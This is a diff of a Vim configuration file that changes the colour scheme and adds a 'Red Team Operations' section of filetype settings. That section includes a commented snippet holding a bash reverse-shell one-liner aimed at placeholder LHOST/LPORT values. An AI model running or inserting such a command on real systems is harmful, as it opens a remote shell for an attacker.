@@ -1,12 +1,6 @@
-" .vimrc
-" maleick
-" 10/21/21
-
 " Theme
-packadd! dracula_pro
 syntax enable
-let g:dracula_colorterm = 0
-colorscheme dracula_pro_van_helsing
+colorscheme desert
 
 " General VIM settings
 set nocompatible
@@ -38,3 +32,22 @@ au FileType go nmap <Leader>i <Plug>(go-info)
 
 " Use 8.2 popup windows for Go Doc
 let g:go_doc_popup_window = 1
+
+" ----------------------
+" Red Team Operations
+" ----------------------
+
+" -- Syntax Highlighting --
+" Enable syntax highlighting for common red team file types
+au BufRead,BufNewFile *.ps1 set filetype=ps1
+au BufRead,BufNewFile *.py set filetype=python
+au BufRead,BufNewFile *.pl set filetype=perl
+au BufRead,BufNewFile *.rb set filetype=ruby
+au BufRead,BufNewFile *.php set filetype=php
+
+" -- Snippets --
+" To use snippets, you need a snippet engine like ultisnips or neosnippet.
+" Once you have a snippet engine installed, you can add snippets like this:
+" snippet revshell "Reverse Shell"
+" 	bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+" endsnippet
